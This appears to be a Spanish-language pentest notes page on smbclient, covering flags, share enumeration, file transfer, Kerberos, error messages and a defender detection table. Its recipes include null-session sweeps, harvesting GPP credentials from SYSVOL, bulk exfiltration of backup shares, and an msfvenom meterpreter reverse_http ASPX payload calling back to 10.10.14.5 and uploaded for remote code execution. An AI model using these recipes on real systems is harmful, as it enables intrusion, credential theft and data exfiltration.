---
tags:
  - ciberseguridad
  - herramientas
  - smbclient-smbcifs
tipo: herramienta
estado: terminado
---

# smbclient — Cliente de Línea de Comandos para SMB/CIFS

**smbclient** es el cliente SMB de Samba para línea de comandos: lista shares, navega, sube y descarga archivos en servidores Windows/Samba **como si fuera un FTP** (`smb: \>`). Es el multiplicador de fuerza de la enumeración SMB: cuando [[Nmap Guía Completa]] abre el 445, smbclient es lo que se ejecuta a continuación para ver *qué hay dentro*.

> [!info] Por qué un cliente FTP-like
> SMB es un protocolo de sesión con tree connect, file, directory y print requests. smbclient expone ese protocolo con una interfaz de comandos que todo el mundo ya sabe usar (`ls`, `cd`, `get`, `put`, `mget`), sin montar sistemas de archivos (no requiere `mount.cifs` ni root para la mayoría de operaciones). Para automatización intensiva y ataques (Kerberoasting, PSExec) la alternativa es Impacket — ver comparación abajo.

## smbclient vs las alternativas SMB

| Herramienta | Rol | Mejor para |
|---|---|---|
| **smbclient** | Cliente interactivo de sesión y transferencia | Listar/bajar/subir a mano; `-c` en scripts cortos |
| **smbmap** | Enumeración de shares + permisos + descarga masiva | ¿Qué puedo leer/escribir en **todos** los shares de golpe? ([[SMBMap]]) |
| **CrackMapExec** | Ejecución/post-explotación en masa, logging | Múltiples hosts, credenciales válidas ([[CrackMapExec Guía de Uso]]) |
| **Impacket** (psexec/wmiexec/smbexec/secretsdump) | Ejecución remota y dumping | Obtener shell/remoteshell y SAM — smbclient **no** ejecuta comandos remotos |
| **mount.cifs** | Montaje como filesystem | Trabajo prolongado con un share como directorio local |

Regla práctica: **descubrir y transferir** → smbclient/smbmap; **enumerar en masa** → smbmap/CME; **ejecutar** → Impacket.

## Instalación

| Contexto | Comando |
|---|---|
| **Kali Linux** | Preinstalado |
| Debian/Ubuntu | `sudo apt install smbclient` (incluido en `samba-common-bin`) |
| Clientes Samba completos | `sudo apt install samba` (trae también `smbstatus`, `nmblookup`) |

## Sintaxis base

```bash
smbclient //<servidor>/<share> [opciones]
```

## Referencia de flags de conexión

| Flag | Significado | Ejemplo |
|---|---|---|
| `-L <host>` | **Listar** shares del servidor (sin entrar a ninguno) | `smbclient -L //192.168.1.100 -N` |
| `-U <usuario%pass>` | Usuario y contraseña (sin `%` pide pass en modo interactivo) | `-U 'admin:P@ss123'` |
| `-W <workgroup>` | Workgroup o dominio | `-W CORP` |
| `-I <ip>` | Conectar a IP distinta del nombre (vhosts DNS) | `-I 10.10.10.50` |
| `-p <puerto>` | Puerto TCP (defecto 445) | `-p 139` (SMB1 legacy) |
| `-N` | **Sin** contraseña — prueba de acceso anónimo/null session | `smbclient -L //ip -N` |
| `-n` | Nombre de NetBIOS del cliente (evitar el de la máquina) | `-n MYBOX` |
| `-A <archivo>` | Archivo de credenciales (no aparece en historial/`ps`) | `-A creds.txt` |
| `-k <dominio>` | Autenticación Kerberos (AD) — requiere ticket `kinit` | `-k CORP.LOCAL` |
| `-m <niveles>` | Fuerza nivel SMB (CORE/NT1/SMB2/SMB3) | `-m SMB3` |
| `-e` | Cifrar la sesión (SMB3) | `-e` |
| `-t <seg>` | Timeout (defecto 45 s) | `-t 10` |
| `-d <nivel>` | Debug 0-10 — depurar negociación | `-d 3` |
| `-s <archivo>` | `smb.conf` alternativo | `-s ./smb-local.conf` |
| `-c <comandos>` | Ejecutar comandos internos y salir (**automatización**) | `-c "ls; get x"` |
| `-D <dir>` | Directorio inicial dentro del share | `-D Windows` |
| `-T <modo>` | Modo tar (`c` crear / `x` extraer) para backup completo | `-Tc- "backup.tar *"` |
| `-?` | Ayuda | |

### Archivo de credenciales (`-A`)

```text
username = backup_svc
password = Winter2026!
domain   = CORP
```

```bash
smbclient -A creds.txt //dc01/C$
```

Imprescindible para no exponer passwords en `ps aux`, historial y logs de C2. Proteger con `chmod 600`.

## Los 4 flujos de trabajo diarios

### 1. Enumerar shares de un servidor (lo primero)

```bash
# Acceso anónimo/null session — siempre probarlo primero
smbclient -L //192.168.1.100 -N

# Con credenciales
smbclient -L //192.168.1.100 -U 'CORP\user:Pass123'
```

Salida:

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share
SYSVOL          Disk      Logon server share
backups         Disk      Datos de copias
```

| Share | Qué delata |
|---|---|
| `IPC$` accesible | **Null session posible** — vector de enumeración de usuarios/sistemas |
| `NETLOGON`/`SYSVOL` | Es controlador de dominio → posible GPP passwords en SYSVOL |
| `C$`/`ADMIN$` con creds admin | Vía de [[CrackMapExec Guía de Uso]]/Impacket para ejecución |
| Shares ajenos (`backups`, `datos`) | Objetivo de exfiltración: bajar y revisar |

### 2. Conectarse y navegar

```bash
smbclient //192.168.1.100/backups -U 'CORP\user:Pass123'
```

Prompt `smb: \>` — comandos internos esenciales:

| Comando | Significado |
|---|---|
| `ls` / `dir` | Listar (admite máscaras: `ls *.docx`) |
| `cd <dir>` / `cd ..` | Navegar |
| `pwd` | Directorio actual |
| `get <f>` | **Descargar** archivo (`get remote.docx local.docx`) |
| `put <f>` | **Subir** archivo |
| `mget <máscara>` / `mput <máscara>` | Transferencia múltiple (pide confirmación por archivo) |
| `recurse` + `mget *` | **Descarga recursiva** del árbol completo |
| `mask <máscara>` | Máscara por defecto para mget/mput |
| `mkdir` / `rmdir` | Directorios |
| `rm <f>` | Borrar |
| `rename <a> <b>` | Renombrar |
| `du` | Tamaño del directorio actual |
| `df` | Espacio libre del share |
| `allinfo <f>` | Metadatos NTFS del archivo (streams, fechas) |
| `setmode <f> +r` | Cambiar atributos NTFS |
| `tar c <f.tar> <máscara>` | Crear tar en el servidor y bajárselo |
| `queue` / `cancel` / `print` | Cola de impresión (shares de printer) |
| `exit` / `q` | Salir |

> [!tip] Recursivo sin confirmaciones
> `recurse ON` (o `recurse`) + `mask *` + `mget *` descarga el árbol completo; sin `recurse`, `mget` solo toca el directorio actual. Para carpetas enormes, mejor `tar`: `tar c backup.tar *` comprime en el servidor y hace una sola transferencia.

### 3. Ejecutar sin entrar en modo interactivo (`-c`)

```bash
# Listar y bajarse un archivo en una sola línea
smbclient //srv/share -U 'u:p' -c "ls; cd Reports; get informe.xlsx"

# Bajar recursivamente todo un share
smbclient //srv/datos -U 'u:p' -c "recurse ON; mask *; mget *"

# Bajar un directorio vía tar (transferencia única, preserva estructura)
smbclient //srv/datos -U 'u:p' -Tc "backup.tar Docs/*"

# Subir un payload para la fase de explotación (ver receta)
smbclient //srv/upload -U 'u:p' -c "put shell.aspx"
```

### 4. Autenticación Kerberos (entorno AD)

```bash
kinit admin@CORP.LOCAL
smbclient -k //dc01/SYSVOL -U admin@CORP.LOCAL
```

Con `-k` no viajan credenciales NTLM por la red — solo el ticket; además evita las alertas de NTLM relay y de login sin NTLMv2 que hoy disparan los AD modernos.

## Recetas de enumeración SMB (post-Nmap)

```bash
# 1. Null session a todas las IPs con 445 abierto (lista de Nmap)
for ip in $(grep "/open/" smb.gnmap | awk '{print $2}'); do
  echo "=== $ip ==="; smbclient -L //$ip -N 2>/dev/null
done

# 2. Enumerar usuarios con enum4linux-ng (depende del mismo stack)
enum4linux-ng -U -S 192.168.1.100

# 3. Buscar credenciales de GPP en SYSVOL (dominios AD — password.xml)
smbclient //dc01/SYSVOL -U 'CORP\user:Pass' -c "recurse ON; mask *.xml; mget *"

# 4. Exfiltración eficiente del share de backups
smbclient //srv/backups -A creds.txt -c "recurse ON; mask *; mget *"

# 5. Payload ASPX a un share escribible (upload RCE) — ver Msfvenom
msfvenom -p windows/x64/meterpreter/reverse_http LHOST=10.10.14.5 LPORT=8080 -f aspx -o shell.aspx
smbclient //srv/wwwupload -A creds.txt -c "put shell.aspx"
```

## Detección y contramedidas (visión del defensor)

| Actividad | Señal en logs/EDR | Contramedida |
|---|---|---|
| Enumeración de shares | Eventos **5145/5140** (Acceso de red) con muchos shares consultados en segundos | Alertar por nº de shares/distintos recursos por sesión |
| Null session | Login NTLM anónimo al IPC$ (eventos 4624 tipo 3 con cuentas anónimas) | `RestrictAnonymousSAM`, deshabilitar acceso anónimo al IPC$ |
| Fuerza bruta SMB | Ráfaga 4625 (logon fallido) tipo 3 | Bloqueo de cuenta, Windows Defender Firewall reglas, [[THC Hydra]] deja rastro inequívoco |
| Descarga masiva | Volúmenes altos de lectura NTFS desde una sola estación | DLP + umbral de bytes leídos por sesión |
| NTLM vs Kerberos | Tráfico NTLMv2 en el 445 | Políticas de restricción NTLM — forzar Kerberos |

> [!info] SMB signing y relaying
> smbclient negocia signing si el servidor lo exige. Servidores con signing **no obligatorio** son el caldo de cultivo del NTLM relay — comprobar con los scripts `smb-security-mode` de Nmap y anotarlo en el informe.

## Errores comunes (con mensajes exactos)

| Mensaje | Causa | Fix |
|---|---|---|
| `tree connect failed: NT_STATUS_LOGON_FAILURE` | Credenciales mal (o dominio mal) | `-W DOMINIO` o `DOMINIO\usuario`; probar ` usuario` sin dominio |
| `tree connect failed: NT_STATUS_ACCESS_DENIED` | Autenticado pero sin permiso sobre el share | Probar otros shares o credenciales con más privilegio |
| `NT_STATUS_IO_TIMEOUT` / `NT_STATUS_HOST_UNREACHABLE` | Firewall 445 o host caído | Verificar con Nmap el puerto; probar `-p 139` en legacy |
| `NT_STATUS_CONNECTION_DISCONNECTED` | El servidor exige SMB2 y smbclient negoció SMB1 (o al revés) | Forzar con `-m SMB2`/`-m SMB3`; revisar con `-d 3` |
| `NT_STATUS_BAD_NETWORK_NAME` | El **share no existe** (no el host) | Revisar nombres exactos de `-L` (¡respetar mayúsculas!) |
| `NT_STATUS_OBJECT_NAME_NOT_FOUND` en `get` | Ruta relativa incorrecta dentro del share | `pwd` y `cd` antes; usar rutas con `\` de Windows |
| `NT_STATUS_ACCESS_DENIED` al `put` | Share de solo lectura (o ACL NTFS) | Buscar shares escribibles con [[SMBMap]] (`-f "WRITE"`) |
| Kerberos: `krb5_get_credentials failed` | Ticket caducado o hostname no resuelto | `kinit` otra vez; añadir host al DNS o `/etc/hosts` |
| Null session falla donde antes funcionaba | Windows moderno restringe cuentas anónimas | `RestrictAnonymous=0` solo en labs; contra AD usar credenciales |

## Cheatsheet

```bash
smbclient -L //ip -N                       # shares anónimos
smbclient -L //ip -U 'u:p'                 # shares con credenciales
smbclient -A creds.txt -L //ip             # credenciales fuera del historial

smbclient //ip/share -U 'u:p'              # entrar
# dentro: ls · cd · get f · put f · recurse · mget * · tar c b.tar * · exit

smbclient //ip/share -U 'u:p' -c "ls"      # no interactivo
smbclient //ip/share -U 'u:p' -c "recurse ON; mask *; mget *"   # bajar todo
smbclient //ip/share -k -U u@REALM         # Kerberos
smbclient //ip/share -Tc "b.tar Docs/*"    # backup en tar
```

## Referencias

- Man page oficial: <https://www.samba.org/samba/docs/current/man-html/smbclient.1.html>
- Samba Wiki (SMB2/3, dialects): <https://wiki.samba.org/>
- Concepto de enumeración SMB: [[Enumeración de Servicios y CMS]]
- Herramientas hermanas: [[SMBMap]], [[CrackMapExec Guía de Uso]], Impacket (`secretsdump.py`, `psexec.py`)

## Relacionadas

- [[SMBMap]] — permisos de shares en masa antes de picar a mano
- [[CrackMapExec Guía de Uso]] — ejecución y post-explotación SMB
- [[Nmap Guía Completa]] — cómo se llega aquí (`-p445 --script smb-os-discovery`)
- [[THC Hydra]] — fuerza bruta SMB cuando no hay null session
- [[Msfvenom - Herramienta de Generación de Payloads]] — qué subir por el share
- [[Enumeración de Servicios y CMS]] — fase completa de la que vive smbclient
